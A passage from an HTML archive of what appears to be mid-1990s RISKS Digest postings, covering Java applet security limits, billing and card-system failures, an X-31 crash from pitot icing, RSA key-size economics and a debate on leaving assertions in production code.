someone writes an applet whose goal is to consume all available resources on
your computer, forcing you to kill the browser you're running.  For example,
someone could write an applet that creates a million pop-up windows.  The
windows don't do anything, but creating a million of them might use up all
the virtual memory on your computer and you'd have to kill the web browser
to reclaim the virtual memory.
<P>
Before people engage in too much wailing and gnashing of teeth about
how applets have been too severely restricted -
<P>
We want to enable applets to do interesting things, including making
socket connections, and reading and writing to the file system.  One
way to enable that is to used a signed class loader.  When a trusted
applet is loaded, then the applet could be granted permission to do
some of the things they are prevented from doing by default.
<P>
The goal is to ensure that untrusted applets can't steal or damage
information on a computer running a Java-enabled browser.  Later, we can
allow trusted applets to do things that untrusted applets are not allowed to
do.  Since an implementation bug in a trusted applet could open a loophole
that could be exploited by an untrusted applet, design matters.

The following article was pointed out to me by one of my students,
Elpidoforos Economou (Source: Alitheia newspaper, Cyprus, 13 Nov 1995)
<P>
On Thursday 9 November a whole village (population 3000) had its telephones
disconnected for nonpayment of their bills. According to the newspaper
report, a "computer error" showing all subscribers in the village to be in
default was to blame. Reconnection took place when the problem was
discovered a few hours later.

[The following culled from a brief article in the Nov 4th Guardian (UK
broadsheet)]:
<P>
The UK's two largest credit authorisation systems (Barclay's PDQ and
NatWest's Streamline) failed on Saturday Oct 28th leaving retailers
unable to verify customers cards.
<P>
In Barclay's case more than 40% of transactions failed due to "a bug
in the system's software". For NatWest the problem was a huge
backlog of calls [reason unstated in article] which delayed card
authentication.
<P>
Both systems had contingency systems which allow retailers to
telephone in authentication requests. However, due to the volume of
sales, the lines rapidly became jammed.
<P>
Comments:
<OL>
<LI>It looks like the phone based contingency system was setup with the
failure of small parts of the network in mind, rather than the failure of
the system as a whole. I wonder if this was an oversite, or a deliberate
cost/risk decision.
<P>
<LI>To me the most interesting comment was on the use of final resort manual<BR>
"zip-zap" machines used for recording card details. According to Barclay's
many retailers had forgotten how to process paper-based transactions! Over
reliance on tech strikes again (along with improper training).

A jaw-dropping item in the "Legal Grounds" column by Reynolds Holding in the
13 Nov 1995 *San Francisco Chronicle*:
<P>
A group of researchers at New York University Law School have been working
on something called the "Solomon Project" to develop software to decide
legal cases without bothering with juries.
<P>
Quoting Holding:
<UL>
<LI>Attorneys enter all admissible evidence into Solomon under
the supervision of a judge.  All the lawyers, clients, and
witnesses take lie-detector tests to make sure they're
telling the truth.
<P>
<LI>When the facts are in dispute, Solomon participates in
depositions, listening to witnesses and judging their
credibility with -- yikes -- "voice stress analysis and
the inputs from polygraph telemetry."
<P>
<LI>After asking a few questions, Solomon searches through
its massive library of laws, ethical rules and factual
precedents.  Then it makes a decision and, if necessary,
issues an opinion and sentence.
</UL>
Oh, and the decision can't be appealed.
<P>
Gee, where do I start?  Are polygraph (so-called "lie-detector") results
admissible in court?  How about voice-stress analysis?  Can it be
fair to non-native English speakers?  No appeals!?
<P>
A comment at the end of the column by trial consultant Karen Koonan
sums it up:  "It's pretty scary."

My earlier message reported an item in the "Legal Grounds" column in the
S.F. Chronicle about the "Solomon Project" from New York University Law
School.  This is a grand and implausible scheme to decide legal cases by
computer without bothering with a jury.
<P>
A couple of calls to NYU revealed:
<UL>
<LI>Joseph Bonuso, supposedly the director of the project, is not listed
in any NYU directories.
<P>
<LI>The Law School Dean's office states that the Solomon project is using
NYU's name, but has nothing to do with NYU, and "is being investigated."

Looks as if it's a hoax.

A big-time software pirate was arrested in Los Angeles last week and charged
with two felony counts of fraud and trademark violations.  Authorities
seized an estimated $1 million in illegally copied software, high-speed
duplicating equipment and $15,000 in cash.  Thomas Nick Alefantes, who calls
himself "Captain Blood," allegedly sold his wares through advertising in
trade publications and a mail order business.  (Wall Street Journal 15 Nov

This note is intended as a break from the usual horror stories.
<P>
I just returned from Tokyo as a passenger on a non-stop flight from there to
Newark.  Twelve hours in the air in a Boeing 747-400.
<P>
Along the way I got a look at the flight plan and chatted with one of the
flight crew about it.  On this particular flight, we were filed with a
destination of Detroit and with Cleveland as our alternate (All airline
operations must state a primary and alternate airport; the alternate must be
forecast to have weather substantially better than what is nominally
required for landing.  There must be enough fuel on board to fly to the
primary airport, do a missed approach there, fly to the alternate, and land
with 45 minutes of fuel still on board), with the intention of revising the
flight plan enroute to have a destination of Newark and an alternate of
Boston.
<P>
Why the revision?  Because the fuel consumption estimates on which the
flight plan is based have 10% padding.  On a 12-hour flight, that means an
extra 1.2 hours of fuel on board.  That's a lot.  So they plan to land in
Detroit, which is an hour or so closer than Newark.  Then, when they're over
central Canada somewhere, they check again how much fuel they really have.
If it's what they expect, the 10% padding is now a much smaller amount and,
as expected, they have enough to continue to Newark.  If, on the other hand,
they can't prove that nothing is wrong, then they have a safe place to land
with plenty of fuel on board.
<P>
I think that's a nice example of risk management and foresight.

There has been much recent discussion in RISKS of accidents and incidents
involving the commercial fly-by-wire aircraft, the Airbus
A319/320/321/330/340 series and the Boeing B777. I've collected the RISKS
discussions since September 1993, along with synopses and a little
commentary, in a hypertext compendium, entitled `Incidents and Accidents
with Fly-by-Wire Commercial Airplanes', accessible through my home page
<P>
<A HREF="http://www.techfak.uni-bielefeld.de/~ladkin/">http://www.techfak.uni-bielefeld.de/~ladkin/</A>

I intend that more RISKS and other discussion will appear as time goes by.
Comments, additions and corrections welcome. If you have technical material
that really should be linked, please let me know.

<P>
I forwarded the X-31 crash info to a friend (Martin Gomez
<A HREF="mailto:martin@hiflight.com">martin@hiflight.com</A>) who copied me the following correspondence.
Steven Weller +1 415 390 9732 <A HREF="mailto:stevenw@best.com">stevenw@best.com</A>
<P>
A friend forwarded your note on the X-31 crash, and it made me grind my
teeth a little, so I thought I'd reply directly to you.
<P>
I am a private pilot, and I design flight control software for a living.
Based on this experience, please allow me to disagree with a couple of
points you made.  1) "It is apparent to me that this crash is the result of
a bug in the flight control software and sensor hardware of the X-31
aircraft.  The computer was unable to compensate for a loss of the airspeed
indicator."
<P>
That is a non-sequitur.  A "bug" is not the same as a missing feature.
Microsoft Word 6.0 can't do my taxes for me, but that's not a bug.  To me, a
bug is when the computer does something other than what the designer
intended. If the designer intended the computer to detect and compensate for
the loss of a sensor, then you're right, it was a bug. My understanding,
from talking to engineers on the X-31 project at Dryden, is that the flight
computer was NOT meant to detect such failures. It therefore acted
correctly, in the sense that it did what it was designed to do.  Obviously,
it would have been nice if it could detect that the airspeed sensor had
failed, but it's inability to do that is not a "bug" as you suggest.
<P>
"(a reading of zero is pretty impossible while the aircraft is flying)"
<P>
That's certainly true, but I don't think that's what happened to the X-31.
First of all, this aircraft had a Kiel tube, not a pitot tube.  No, I don't
know the difference either!  Assuming they work under the same principle
(the measurement of dynamic pressure) then, like pitot tubes, they are
subject to the same two forms of icing: 1) the total pressure port gets
clogged, or 2) the static pressure port gets clogged.  You may already know
all this, but ...
<P>
In case 1, the airspeed reading will not change as the airspeed changes.
The air in the pitot tube (or Kiel tube, presumably) gets trapped. As the
ALTITUDE changes, though, the static pressure will change, and the airspeed
reading will decrease as the altitude decreases. In case 2, the indication
will react correctly to changes in airspeed, but changes in altitude will
have an odd effect: going lower will cause the airspeed to read higher, and
vice-versa.
<P>
I heard that case 1 is what occurred to the X-31 that day. The pitot side
iced up at altitude, and as the aircraft descended to return to base, the
reading decreased, with the results you mentioned.
<P>
"We need to understand these differences before we use computers to take
over the job of a human."
<P>
That's true, too. I assume your article (I'm unaware of the context, since
it was forwarded) is a warning to software designers to be careful what they
assume, etc.  You must realize, though, that "it was a software problem" is
the perennial cry of the hardware engineer who asked for the wrong software,
and got what he asked for.
<P>
This is the reason that my company hired a pilot to design flight control
software...I usually know what the computer "should" do.  In most cases,
though, software designers have to assume the specs they are given are
valid, and take all failure modes into account. Is it a software problem
that the X-31 can't land vertically? Or that it carries less than one hour
of fuel?  If a pilot crashes the remaining X-31 because he tried to land it
vertically, or to fly coast-to-coast, that's not a software problem, so
neither is failure to detect a sensor error.
<P>
Martin Gomez
<P>
[Guilty as charged.  I agree with you, the X-31 crashed because of a
SYSTEM DESIGN error, not a software bug.  It would have taken more than a
software change to prevent the loss of control.
<P>
I have some flight experience (1.5 hours solo before marriage and a house
changed financial priority) and I have spent a couple of years writing
flight navigation and autopilot software, as well as flight simulator
software.  I believe that my private pilot training had a significant
impact on my ability to write autopilot code.  I'm glad to hear that
companies are recognizing that pilots write better flight control software
(and this hopefully will extend to other disciplines, as well).
<P>
I didn't think through the complete implications of pitot tube icing
(although I did remember that often the effect of clogging the dynamic
pressure sensor is to cause airspeed indication to remain constant).  It
is an interesting point that IAS would gradually decrease as the altitude
decreased.  This would make for an interesting control problem.  My copy
of the Private Pilot Manual (Jeppesen Sanderson, 1990) notes a third
possibility: If the pitot tube is blocked and its drain hole remains open,
the airspeed reading will drop to zero (usually gradually).  This failure
mode may or may not be applicable to a Kiel tube.
<P>
The root problem remains: an instrument critical to the operation of the
aircraft can fail in a way that is not detected by the system.  Clogged
airspeed indicators are a common problem, and they appear to cause
catastrophic failure of the X-31.  I see a recurring problem of software
designers (and system designers) getting inadequate requirements
specifications.
<P>
The real point is that we are "pushing the envelope" in using computers to
control complex systems.  When the systems are dynamic (like flight
control) they are difficult to specify and difficult to test.  We learn
from our mistakes.  Some mistakes have bigger consequences than others:
our X-31 pilot was pretty lucky!  Presumably, the next spec for the X-31
flight control system will have a line that reads: "failure of the
airspeed indicator shall not cause loss of control of the aircraft", or
"failure of ANY sensor shall not cause loss of control of the aircraft"
(although I would NOT like to be on the team that had to test that latter
requirement!).

Re: Faster computers will never make security safer! (Re: Palme, 17.45)
<P>
If you ignore issues other than the encryption (&amp; assume it's RSA, say), and
ignore what quantum computers might be able to do, then the difficulty of
encrypting goes up with something like the cube of the size of the key, but
the difficulty of cracking goes up with something like the exponential of
the size of the key.
<P>
That's the whole reason encryption can work.  If cracking were only a
constant factor harder than encryption then the safety margin would never be
enough.  It has to actually scale differently--and (with the qualifications
above) as far as we know it does.
<P>
The question of building encryption into all communications involves another
scaling issue though: the speed and cost of communications vs. processors.
For quite a while we've had 10Mbps ethernets while processors kept getting
faster.  If this were to continue, pretty soon we'd all be happy to let the
processor spend a small part of its time encrypting all traffic.  But if
communication speed/cost catches up again then we'll still be tempted to
send at least some things in the clear.

<P>
&gt; The problem is that CPU time becomes less costly at the same ratio<BR>
&gt; for the encrypter as for the encryption breaker.
<P>
This assumption is wrong.
<P>
Quite clearly an encryption algorithm that is as cheap to break as to
encrypt is worthless -- encryption systems are by definition designed
to be harder to break than to encrypt.
<P>
However Jacob was comparing *ratios*, and a less intuitive though
demonstrable fact is that while increasing CPU speeds helps both
encryptor and breaker, the performance boost helps the encryptor
*more* than the breaker.  This is because the encrypt and break<BR>
functions are of different complexity.
<P>
For example the RSA public key cipher used for key exchange, when
small public exponents are used the encryption process is of O(n^2),
and decryption O(n^3), but the time to break is a function running in
super polynomial time involving factoring a product of two large
primes.
<P>
So, some estimates of time to break (factor RSA modulus using GNFS)
(extracted from a post Bruce Schneier's made on cypherpunks):
<P>
# of bits         mips-years required to factor
<P>
1024              3*10^11<BR>
2048              3*10^20
<P>
And (real figures - PGP) encrypt and decrypt for the same key sizes
(100Mhz R4600 based Indy workstation ($5000 workstation)):
<P>
# of bits	encrypt	decrypt
<P>
1024		0.06 s  1.2 s<BR>
2048		0.11 s  7.7 s
<P>
So say for arguments sake that a particular encryption system was
using 1024 bit keys, and that CPU speed increased by 10 fold.
<P>
Now the encryptor could use 2048 bit keys in place of 1024 bit keys,
with the same (or slightly better) real time response.
<P>
The breaker however is faced with a 10^9 increase in MIPs-years
required to break, and only a 10 fold increase in CPU to speed the
attack.  The breaker is 10^8 times worse off, and the encryptor is
marginally better off.
<P>
As CPU speeds increase, the code breaker loses.

In <A HREF="/Risks/17.45.html">RISKS-17.45</A>, Derek Lee Beatty comments about Microsoft Press's
_Writing_Solid_Code_, specifically its claim that.  "assertions that check<BR>
for programming errors [...] can be removed from the shipped versions for
better performance."  His comment is that this idea is "neither new nor so
entertaining to RISKS readers, but it's sound advice."
<P>
Ouch.  Hopefully most RISKS readers reacted immediately to this
statement.
<BLOCKQUOTE><I>
[See the next two messages.  PGN]
</I></BLOCKQUOTE>
I'm fond of the saying that "When your program's internal state becomes
invalid, the *best* thing that can happen is that it crashes immediately."
Programmers make mistakes; failing an internal assertion will prevent a
mistake from propagating through a program execution and leading to
undetected severe execution errors.  For example:
<UL>
<LI>I'd rather have my bank's software crash than lose
track of all my money.
<LI>I'd rather have my hospital heart-rate monitor crash
than report that my heart is still beating when it has,
in fact, stopped.
<LI>I'd rather have my word-processor crash than silently
change my boss's name from "Bud" to "Bug" in my	document.
</UL>
In addition, failed assertions typically can cause a program to "crash
gracefully", yielding information useful in fixing the bug, and cleaning up
enough internal state to prevent major disasters: buffers can be flushed,
files can be closed, etc.
<P>
There are probably a few assertions which belong only in development code,
because they are so expensive to check that they make the product unusable.
In my experience, this is surely *not* the common case.  If this is "the
Microsoft way," please choose an alternate route.

<P>
Derek Lee Beatty's support of Microsoft's code development is amazingly
naive. Remove assertions that check for programming errors? Rigorous testing
can not prove a program bug free, and removing these tests just makes the
bug harder to find. The bug, when it finally manifests, may end up being
blamed on a completely separate product...
<P>
This is of course to Microsoft's advantage. It lets them make claims like
"there are no bugs in Microsoft products that the majority of users want
fixed"... like the way Microsoft Project for Windows crashes under NT 3.5,
or the way the POSIX subsystem in NT hangs unexpectedly...
<P>
(no, I haven't reported these to Microsoft. Why should I? They're not going
to fix it... we're going to have to upgrade to 3.51 just to get around this
bug, for all that Bill Gates claimed "A bug fix is the worst possible reason
to release an upgrade" or words to that effect).
<P>
Suns maze of patches might be tough to figure out, but at least they admit
they've got bugs and do their best to fix them. Bill Gates, ruler of the
free world, remains in his state of denial.
<P>
(on another tack, the Java interpreter runs with no security enabled, for
performance reasons. All the security is implemented in theorem provers
and other test mechanisms prior to execution. This is much like the old
Burroughs boxes, where the compiler guaranteed that no operation that
violated the security policy was generated. It's much easier to do that
than check the output of an untrusted compiler. I would much rather they
implemented strict runtime checks at the interpreter level at the cost of
some performance.)

<P>
So now the book and Dekek Lee Beatty go hand in hand giving bad advice.
<P>
Solid code keeps the checks for programming errors! You can never ever
guarantee that no programming errors are going to surface in a production
version.  Keeping the code that checks for "programming errors" is going to
catch lots of errors earlier on.
<P>
Moreover it is going to catch errors that aren't programming errors.
Continuing with an inconsistent internal data representation is a bad idea.
Whatever the cause.
<P>
Off course you might remove some of the 'code to find bug xyz'. The internal
consistency checks (This pointer shouldn't be "NULL", this "switch" needs no
"default") should remain.

I was entering exam grades in my class spreadsheet file.  I formatted the
column as percent.  Then I started typing in the grades as usual.  I typed
89% for 89% sometimes.  Other times, I typed in .89.
<P>
Fortunately, before I printed the results, I sorted in decreasing order
of score on the exam.  I noted that one of my usual top students was
missing.  Checking, I found that he has the lowest score in the class.
<P>
The new version of Excel for Windows 95 allows you to type numbers like 89%
as 89%, .89, OR 89.  It figures that if you are typing 89, you mean percent.
<P>
Well my student received a 100% score.  So I typed a 1 (1.00).  It
literally gave him 1%.
<P>
The new Microsoft algorithm had run into an ambiguous case.  Numbers below 1
were recognized properly, while numbers above 1 were recognized properly.
Logically, however, the two methods of treating numbers clash as 1.  Is the
proper thing to do in such cases to throw up a dialog box, explain the
situation, and ask the person if he or she wants to make this 1% or 100%?
The dialog box could even explain the (I believe) new way of handling
percentages.
<P>
As we add more and more intelligence to software, it becomes easier to use
in most cases but rather dangerous in other cases.  Just as programmers need
to consider boundary values when the test program with data, designers of
intelligence will need to consider boundary values.  They should then "open
the box" and bring the user into the decision.

About a week ago I received an electricity bill, which I paid the same day.
<P>
The following morning I received another bill.  Since I usually receive each
bill once per quarter I phoned the electricity company.  A search on their
computer revealed that the second bill had been issued because my account
had been closed.  The lady who answered the phone agreed to reinstate my
account and told me to ignore the bill.
<P>
Yesterday I received another bill, but this time in somebody else's name -
somebody I had never heard of.  I phoned the electricity company again.  A
search on the computer showed that this person had given my address as their
new address when they closed their account - a check on the paper record
showed that this wasn't just a keying error at the electricity company.
<P>
It seems that to close an account you must leave a forwarding address.  This
person had for their own reasons (I have a plausible but unsubstantiated
hypothesis) given my address.  The side-effect is that my account got closed
as well.
<P>
I was amused, however, to note the magic letters "CR" next to the amount on
his bill: the person responsible had disappeared while the electricity company
still owed him 20 pounds, because they had overestimated his previous bill.

I've seen no discussion of a risky behavior that I think is prevalent in the
software industry: isolating yourself from your customers.
<P>
Most software companies make it hard to submit bug reports to them.  I have
tried many times to submit bugs and suggestions to Microsoft, for example,
via e-mail addresses, automated "product wish" phone lines, etc.  In most
cases, the suggestion disappears into thin air, with no feedback to indicate
that it ever reached a human.  And the same bugs appear in release after
release.  Other companies are similar.
<P>
Manufacturers should actively solicit this kind of feedback.  They even
could offer some kind of certificate or "gold star" or small amount of money
to the first person to report each serious bug.
<P>
The risks (of not communicating) to the manufacturer include:
<UL>
<LI>increased calls to tech support.
<LI>customers stop buying your product (unless you have a monopoly).
<LI>customers reluctant to buy any other products from you.
<LI>loss of reputation.
</UL>
The risks to the customers include:
<UL>
<LI>costs of working around the known bugs forever.
<LI>costs when you are damaged by a bug that you didn't
know about, but could have been fixed long ago.

<P>
BELLEVUE, Wash. - While the computer industry celebrated the Internet as the
Next Big Thing at the Comdex trade show in Las Vegas last week, a computer
crime expert offered a cautionary tale of the perils that may await those
who venture online.  Richard Bernes, supervisor of the FBI's high-tech squad
in San Jose, Calif., said that in 90 percent of the cases his office
handles, the Internet is the unlocked window in cyberspace through which
thieves crawl.  "This whole phenomenon is still new and still growing,"
Bernes said.  "In time, the dust will settle, but now it's pretty wild and
woolly."
<P>
In the rush to commercialize the Internet's World Wide Web, companies are
working to develop standards and software that safeguard vital corporate
databases as well as financial information for electronic banking and online
commerce.  But hackers pose a significant threat. The potential for theft of
credit card numbers transmitted over the Internet "is phenomenal at this
point," Bernes said.
<P>
Bernes was the keynote speaker at a Bellevue seminar on high-tech theft,
sponsored by the American Electronics Association, tile Washington Software
Association and the Chubb Group of Insurance Companies.
<P>
Industrial espionage and theft of intellectual property and trade secrets
are also on the rise.  Technology-related crimes cost U.S. businesses up to
$8 billion a year, and that will likely balloon to $200 billion in four<BR>
years, according to the American Insurance Service Group. In roughly
two-thirds of the cases, the theft was an inside job pulled by employees,
former employees, or suppliers and vendors.
<P>
High-tech crimes are no longer exclusively of the white-collar variety. The
scarcity of computer chips has fostered a nationwide rise in burglary and
strong-arm robbery involving semiconductor manufacturers, computer makers
and other electronics firms, Bernes said.  Up until 1990, there had never
been a report of an armed chip theft.  This year, he said, 46 cases were
reported through May 25. The incidents have been increasingly violent. In
Portland's Silicon Forest, thieves wearing Halloween costumes smashed
through a plate glass window In a late-night raid at a semiconductor plant.
Thirteen workers were handcuffed and gagged, and $2 million worth of memory
chips were lifted.
<P>
Bernes urges companies to beef up security and educate workers on how they
can prevent breaches in work place safeguards. To curtail hacking and
network incursions, companies should install software "firewalls," use
encryption for sensitive e-mail information and data-bases, and change
employee pass-words frequently.  "We like to call chip theft the crime of
the '90s," Bernes said. "I think cyberspace (theft) will be the crime of the
next century."

<P>
I personally find the idea naive and, more importantly, deeply repugnant
(actually `deeply repugnant' doesn't capture the half of what I think).
Kowalski would, of course, disagree with me.  If anyone is interested in
following the debate, there have been several books (collections of
philosophical papers) on the use of computers in law, which contain
discussions of the implications of this sort of use of computers. They
should be available in any decent jurisprudence library.

&gt; If you ignore issues other than the encryption (&amp; assume it's RSA, say),

&gt; but the difficulty of cracking goes up with something like the exponential
&gt; of the size of the key.

Adam writes:
<P>
&gt;&gt; The problem is that CPU time becomes less costly at the same ratio for
&gt;&gt; the encrypter as for the encryption breaker.
<P>
&gt; This assumption is wrong. ... the encrypt and break functions are of
&gt; different complexity.
<P>
&gt; For example the RSA public key cipher used for key exchange, when small
&gt; public exponents are used the encryption process is of O(n^2), and
&gt; decryption O(n^3), but the time to break is a function running in super
&gt; polynomial time involving factoring a product of two large primes.
<P>
Both of these arguments assume something that is manifestly not true; namely
that we understand why cryptosystems are hard to break and have confidence
in their strength.
<P>
In fact there is only one cryptosystem whose strength rests on a firm
theoretical foundation: the Vernam one-time pad.  Other systems have proven
to be resistant to attack *in practice* (DES is the best example), but the
bases for their strength are not at all well understood.  RSA in particular
depends for its strength upon the intractability of a classical problem
(factoring) that is *believed* but not *proven* to be hard.
<P>
When cryptography was used only in limited contexts and not widely
understood, this situation was fairly safe.  If cryptography is, as some
advocate, to become the guarantor of integrity of some substantial portion
of our national wealth, via electronic commerce, digital cash, or other
technologies, we ought to step back and ask whether we really have enough
confidence in our cryptography to make this kind of a bet.  A $20B US reward
(or more) puts an entirely new spin on the problem of fast factoring.

As an aircraft mechanic who once witnessed a returning aircraft run out of
fuel on the taxiway with 5,000 pounds of fuel showing on the gauges, I tend
to disagree.  Fuel quantity instrument systems on aircraft do fail
frequently and are not very accurate.  Personal experiences include
refueling aircraft and just happening to notice the amount of fuel pumped
did not add up properly to what the quantity gauge showed.  I've also
defueled and depuddled fuel tanks and the gauges still showed nearly 1,000
pounds of fuel on an aircraft that only held 7,000 pounds total.  When
filled the aircraft read correctly.  (An aside: The fuel low light on this
particular model of aircraft is connected to the quantity gauge and not some
independent sensor or float.  If the gauge malfunction, you didn't get a low
fuel warning either!)
<P>
In a nutshell, I believe that the aircrew should use their original
estimates and not depend on an in-flight fuel measurement.

Andrew Koenig describes a flight he took, for which the flight plan give a
destination other than where he thought he was going, with the idea that it
would be revised in flight.
<P>
I find I must differ about how well the risk is truly managed in this case.
It seems to me that this is instead a case of the system (in this case, the
10% fuel padding rule) getting in the way and being circumvented.  Would it<BR>
not be more straightforward to use a realistic fuel estimate, with a planned
refueling stop should consumption prove higher than expected?  It was not
too long ago that a plane landed in Brussels when the passengers thought
they were going to Frankfurt; certainly the filing of fictional flight plans
can only serve to increase the risk of a recurrence of this kind of
incident?
<P>
My point, I guess, is that a risk management system that forces the airlines
to use ruses to get around (evidently) overly repressive requirements can
only add risks of its own.

<P>
<A HREF="/Risks/17.46.html">RISKS-17.46</A> and 17.47 had a few mentions of programming assertions.  I want
to point out that all assertions are not created equal.
<P>
Asserting that a memory pointer is not NULL before dereferencing it is a
good test to leave in.  Usually.  Unless you're inside a tight loop of
heavily-used code, and you've verified that all routes to that code already
guarantee that the pointer is non-NULL -- this is often a trivial proof.
<P>
Another example: Barton Massey states that:<BR>
+ I'd rather have my hospital heart-rate monitor crash
than report that my heart is still beating when it has,
in fact, stopped.
<P>
That assumes that the behavior sans assertions is to continue assuming the
previous state.  That's a depressing possibility, but what if your choice
were between crashing and continuing to display current status but without a
printout?   At some stage of testing, killing the program if it can't get a
buffer with which to print may make sense.  But closer to live testing,
you'd rather keep functioning as much as possible.
<P>
Yes, there are other tools besides assertions (log to a message file, emit a
sound, dial a modem and wake up the programmer).  But those tend to suffer
similar types of limitations, especially in embedded systems.
<P>
There is no simple rule about keeping assertions in production code that
will achieve the best results in even a majority of the cases.
<P>
In my view, each sizable project needs to include analysis and design of its
hierarchy of failure modes, and this is in fact what C++ is trying to
formalize with its "exception" classes: classes of "exceptional conditions",
detected by the program or the run-time library or the O/S, for which the
response can be different (and can depend on the context in which the
exceptional condition arose).  It's a new feature, not particularly simple,
so we'll see just how well it's utilized over the next few years.

It appears as though I was hasty in implicating a software bug in the crash
of the X-31 aircraft.  Some others have, correctly, pointed out that the
software was most likely not designed to detect icing of the air data probe,
and acted exactly as the programmers intended.  Airspeed is generally
measured by an air data computer, and subsequently passed on to other
aircraft systems, such as a flight control computer.  Problems with air data
probes (pitot-static systems) are normally detected by the air data computer
comparing readings from 2-3 different probes, but the X-31 may have had only
one probe, being a small experimental research aircraft.
<P>
One colleague noted that the probe heater (which normally prevents icing)
was disconnected during this flight, and the pilot was not correctly
briefed.  Thus, the immediate cause of this incident was a break in
communication between maintainers and the pilot.
<P>
Note that this is the only incident in recent aviation history that could
be attributed to pitot tube icing, but as aircraft become more difficult to
control without the assistance of computers, this information takes on added
criticality.
<P>
I think we all remained in agreement, however, that there is a hole in the
system design, and that the crash is directly attributable to the use of a
computer to drive the control surfaces.  A well-known failure of a single
sensor (or set of sensors) can cause catastrophic failure of this aircraft.
This might be appropriate for research aircraft, but it is instructive to
remember it so that we may avoid similar actions in systems to which the
public is exposed.

Andrew Fuller and Martin Gomez in <A HREF="/Risks/17.46.html">RISKS-17.46</A> continue the discussion on the
X-31 airspeed sensor icing, and come to the reasonable conclusion that there
wasn't a software bug. But should we Kiel-haul Fuller for suggesting that
design failures are requirements failures?
<P>
Two points made by a Dryden colleague, contained in my article on the X-31
accident in <A HREF="/Risks/16.89.html">RISKS-16.89</A>, seem to be worth repeating.  Firstly, airplanes
with mechanico-hydraulic control systems (F4s) have been lost for similar
reasons.  Therefore, calling the causal sequence a `software bug' is
misleading. Secondly, multiple systems may be involved: a flight control
system, which implements the flight control laws; systems that send signals
to wiggle control surfaces.
<P>
Even though there was a failure, it is premature to conclude it may have
been a requirements failure, as Andrew Fuller seems to suggest.  A failure
in the interaction between systems may be a design failure, without being a
requirements failure. Consider the AFTI F-16 example from John Rushby's
WWW-pages
<P>
<A HREF="http://www.csl.sri.com/rushby/anomalies.html">http://www.csl.sri.com/rushby/anomalies.html</A>
<P>
The software was not at fault -- the processors did what they were
programmed to do. The requirements were fine -- the system didn't fulfill
them. The design was at fault. Best to keep the three concepts separate.

SOFTWARE DOCUMENTATION AND INSPECTION<BR>
An Intensive Course for the Software Professional by David L. Parnas<BR>
McMaster University, Hamilton, Ontario<BR>
January 22-25, 1996<BR>
<P>
The Telecommunications Research Institute of Ontario (TRIO) is pleased to
present an intensive course on software engineering.  A previously presented
three-day course on software inspection and documentation has been combined
with an optional introduction that provides a broader, more basic,
introduction to software design principles.
<P>
Dr. David L. Parnas is an internationally known expert and researcher in the
area of software engineering. He is well known as the first person to write
about "information hiding", which is the basis of modern object-oriented
techniques.  He has also been a leader in the development of mathematical
models for software description.  Dr. Parnas, whose motto is "connecting
theory to practice," initiated and led the US Navy's Software Cost Reduction
project. He has also been a consultant to the Canadian Atomic Energy Control
Board, US Navy, IBM's Federal Systems Division and many other organizations.
<P>
He has won several "best paper" awards, has an honorary doctorate from the
ETH in Zurich, and has provided education for many industrial organizations.
Dr. Parnas is also a project leader for the Telecommunications Research
Institute of Ontario, a Fellow of the Royal Society of Canada and the ACM,
and a Senior Member of the IEEE.
<P>
Software is critical to the operation of modern companies and is frequently
a key component of modern products. Some pieces of software are particularly
critical; if they are not correct, the system will have serious
deficiencies. Systematic inspection is essential. This course teaches a
procedure for software inspection that is based on a sound mathematical
model and can be carried out systematically by large groups.  The software
inspection procedure combines methods used at IBM, work originally done at
the US Naval Research Laboratory for the A-7E aircraft, and procedures
applied to the inspection of software at the Darlington Nuclear Power
Generating Station. The method has been refined and enhanced by the Software
Engineering Research Group at McMaster University. It can be applied to
software written in any imperative programming language.
<P>
This three-day course will give participants an understanding of the way
that mathematics can be used to document and analyze programs.  Participants
should be experienced programmers and willing to use some basic mathematics.
The mathematics are classical and take up only a few hours of the course,
however, it is fundamental to the method. It is expected that the
participants will be accustomed to reading code written by others and it
will be helpful if they can read Pascal.
<P>
The method is language independent. On the third day, participants inspect
code written in a language that they use in their workplace. This course
presents an approach to active design reviews that has the reviewers writing
precise documentation about the program and explaining their documentation
to an audience of other reviewers. A significant part of each day is spent
using the ideas that have been presented. On the last day, participants
inspect a small, working program that they bring with them from their
company. In previous courses, unexpected discrepancies were found in every
program that was inspected.

Eyecare Products plc, a company listed on the UK stock exchange, recently
offered a 'scrip dividend', where shareholders could opt to take extra
shares in place of the cash dividend. As a result of what the company
describe as a programming fault, "several certificates were issued in error
to shareholders".
<P>
I received the correct certificate, plus another for almost twice the number
of shares. It is not clear to me how many other shareholders received extra
certificates.

&gt; Where does the system signal handler store the information to return<BR>
&gt; (since the system cannot know that you are going to longjmp out)?<BR>
&gt; Some Unixes (Sun, for example) allow you to specify a separate stack<BR>
&gt; for signal handling, but this is far from universal.  In all cases,<BR>
&gt; the default action is to push the current context onto the stack<BR>
&gt; (oops).
<P>
On SunOS and Solaris, there is a portion of the context reserved for storing
register windows that could not be spilled because the stack (where they
would ordinarily be spilled) was not mapped.  This assumes, of course, the
use of an alternate stack for catching signals.  It is possible, in theory,
to reserve a guard page, and remap it in your signal handler, and return
from the interrupt in some more appropriate way.
<P>
However, this code was not extremely well-tested (or rather, I appear to be
the first person to ever write a thorough test of it).  A test program whose
only function was to recurse a lot on just such a guarded stack, extending
it as necessary in the signal handler, and then return from the recursion,
ultimately failed (this was in 1993) on every single hardware-OS combination
available to me (while working at Sun, mind you) except a SparcStation 10
running SunOS 4.1.3.  Any other Sparc hardware, any other Sun OS, it would
eventually fail.  Solaris (at the time, releases 2.1, 2.2, and 2.3alpha)
failed a little faster than SunOS, but except on that one platform, SunOS
running this program would eventually enter a "funny state".  Here, "funny
state" is defined as "neither longjmp, exit, nor abort behaves as
documented" (think about recovering gracefully from that for a minute or two
:-).
<P>
( Actually exploring the failure modes was somewhat difficult.  The
"write" system call actually continued to work just fine, so this
program could talk about what was wrong with it, and I checked
ALL return codes in detail, but the behavior changed completely
when run under any debugger.  For good measure, alarming messages
would appear on the system console every time I ran the program.
The bug was actually first found on Solaris, by reading the OS
to try to figure out what some of those funny fields in the context
structure were.  The bug tracker wanted a reproducible test case,
so (after much thought) I wrote one. )
<P>
So, I ask, those of you theorizing so confidently about code which recovers
from errors, have you written such code?  Have you tested it thoroughly?  Do
you have confidence that the OS code to handle this situation was tested
thoroughly?  (If so, why? Do you think people write and run this sort of
code every day?  It's not exactly as common as opening and closing files.)
If you tested it "thoroughly" on a Sun running SunOS or Solaris, how DO you
suppose that you avoided the bug that I described above?  Did you test your
recovery code across multiple platforms, just-in-case?  What's the point of
writing "recovery code" if you didn't?
<P>
